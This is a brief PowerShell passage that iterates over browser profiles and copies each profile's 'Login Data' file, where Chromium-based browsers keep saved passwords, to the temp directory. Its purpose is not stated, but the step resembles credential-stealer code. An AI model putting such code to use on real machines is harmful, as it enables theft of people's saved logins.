    foreach ($profile in $profiles) {
        $dbPath = Join-Path $BrowserPath $profile "Login Data"
        if (Test-Path $dbPath) {
            # Copy to temp
            $tmp = "$env:TEMP\$profile`_LoginData"
            Copy-Item $dbPath $tmp -Force

